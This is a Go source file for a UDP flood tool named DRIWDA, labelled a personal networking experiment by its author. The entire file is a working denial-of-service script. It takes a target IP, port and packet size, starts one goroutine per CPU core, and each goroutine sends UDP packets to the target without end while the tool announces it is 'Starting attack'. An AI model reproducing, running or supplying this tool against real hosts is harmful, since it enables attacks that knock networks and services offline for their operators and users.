// ===== DRIWDA UDP FLOOD TOOL EXPERIMENT =====
// Author: ZeltNamizake (Driyas)
// Repository: LearnGO
// Note: Personal networking experiment using goroutines

package main

import (
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
)

// Print Banner
func banner() {
	fmt.Println(`
██████╗ ██████╗ ██╗██╗    ██╗██████╗  █████╗
██╔══██╗██╔══██╗██║██║    ██║██╔══██╗██╔══██╗
██║  ██║██████╔╝██║██║ █╗ ██║██║  ██║███████║
██║  ██║██╔══██╗██║██║███╗██║██║  ██║██╔══██║
██████╔╝██║  ██║██║╚███╔███╔╝██████╔╝██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝ ╚══╝╚══╝ ╚═════╝ ╚═╝  ╚═╝`)
}

// Print Usage
func usage() {
	fmt.Println(`Usage: ./driwda.go <target_ip>
TARGET SPECIFICATION:
  Can pass IP addresses, port, packetSize
  Ex: ./driwda.go <ip> <port?> <packetSize?>
DEFAULT TARGET:
  - <port> 80 | target Port
  - <packetSize> 1024 | packet size byte/s
`)
}

// Argument Parsing
func parseArgs() (string, string, int) {
	if len(os.Args) < 2 || len(os.Args) > 4 {
		banner()
		usage()
		os.Exit(1)
	}

	targetIp := os.Args[1]
	targetPort := "80"
	packetSize := 1024

	if len(os.Args) >= 3 {
		targetPort = os.Args[2]
	}

	if len(os.Args) >= 4 {
		packet, err := strconv.Atoi(os.Args[3])
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		if packet <= 0 {
			fmt.Println("Packet size must be > 0")
			os.Exit(1)
		}
		packetSize = packet
	}
	return targetIp, targetPort, packetSize
}

// Generate Payload
func generatePayload(size int) []byte {
	payload := make([]byte, size)
	for i := range payload {
		payload[i] = 'X'
	}
	return payload
}

// Worker Spawner
func startWorkers(addr string, payload []byte, numWorkers int) {
	for i := 0; i < numWorkers; i++ {
		go func(id int) {
			conn, err := net.Dial("udp", addr)
			if err != nil {
				fmt.Println(err)
				return
			}
			defer conn.Close()

			for {
				_, err := conn.Write(payload)
				if err != nil {
					fmt.Println(err)
					os.Exit(1)
				}
			}
		}(i)
	}
}

func main() {
	targetIp, targetPort, packetSize := parseArgs()
	targetAddr := net.JoinHostPort(targetIp, targetPort)
	numWorkers := runtime.NumCPU()

	banner()
	fmt.Printf("Starting attack to %s with workers %d core...\n", targetAddr, numWorkers)

	payload := generatePayload(packetSize)

	startWorkers(targetAddr, payload, numWorkers)

	select {}
}
